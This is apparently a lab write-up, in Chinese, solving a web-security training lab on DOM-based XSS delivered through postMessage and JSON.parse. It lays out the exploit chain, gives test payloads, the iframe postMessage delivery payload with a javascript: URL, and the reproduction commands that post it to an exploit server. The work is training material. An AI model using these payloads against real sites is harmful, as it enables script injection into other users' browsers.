---
title: lab-dom-xss-using-web-messages-and-json-parse
---

# lab-dom-xss-using-web-messages-and-json-parse

> evidences: [[dom-xss-family]]

- 题面:DOM XSS using web messages and JSON.parse(/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
- 实例(批45R):https://0a530094030a53db80383a0b0055002e.web-security-academy.net · exploit:https://exploit-0a1900fa03e6534180cc398d01680004.exploit-server.net
- 判定目标:web message 经 JSON.parse 触发 sink 执行 `print()`;状态:**solved**(交付响应正文即 `academyLabBanner is-solved` + `<h4>Congratulations, you solved the lab!</h4>`)

## 利用链

1. 首页内联监听:`message` → `JSON.parse(e.data)` → `case "load-channel": ACMEplayer.element.src = d.url`(唯一 sink,对象是刚 append 的 about:blank iframe)。
2. **本版 Chrome 会执行赋给「刚 append 的 about:blank iframe」的 `javascript:` URL**——批16/38 的「不执行」是**观测点误读**:
   - 手工 append + `f.src="javascript:parent.document.title='CHK1'"` → 顶层 `document.title` 变 `CHK1`(脚本在子帧全局执行成功);
   - 走真 sink:`window.postMessage('{"type":"load-channel","url":"javascript:parent.document.title=\'SINK1\'"}','*')` → 顶层 title 变 `SINK1` ⇒ listener→parse→sink→执行 全链通。
   - 教训:判读只看**父页可观察副作用**;iframe 自己的 `contentDocument.title` 恒为空,与是否执行无关。
3. 交付(exploit server,STORE + DELIVER_TO_VICTIM 一次 POST 即成):

   ```html
   <iframe src="https://<inst>/" onload='this.contentWindow.postMessage(JSON.stringify({type:"load-channel",url:"javascript:print()"}),"*")'></iframe>
   ```

   - `onload` 属性用**单引号**包裹、消息用 `JSON.stringify(...)` 现拼 ⇒ 免去 `&quot;`/`&#39;` 转义地狱;
   - `responseHead` 传 `HTTP/1.1 200 OK\nContent-Type: text/html`。

## 证据摘录

```
deliver 响应: class='academyLabBanner is-solved' ; <h4>Congratulations, you solved the lab!</h4>
browser_suite eval: document.querySelectorAll('iframe') 的 src = ["javascript:parent.document.title='CHK1'",
                    "javascript:parent.document.title='SINK1'"] ; top document.title = "SINK1"
```

## 复现命令

```
range_launch launch 912C5F0D…D64BDCAAC --jar ~/.pi-rs/agent/chrome-jar.json
http_session get "https://<inst>/" --out /tmp/l.html            # 取 exploit-link 主机
http_session post "https://<exploit>/" --jar <jar> --follow \
  --form urlIsHttps=on --form responseFile=/exploit \
  --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' \
  --form 'responseBody=<iframe src="https://<inst>/" onload='"'"'this.contentWindow.postMessage(JSON.stringify({type:"load-channel",url:"javascript:print()"}),"*")'"'"'></iframe>' \
  --form formAction=DELIVER_TO_VICTIM
```

## 关系

- 族:[[dom-xss-family]](web message 源→sink 子型);`print()` 判定语义与 [[browse-dialect]] 一致。
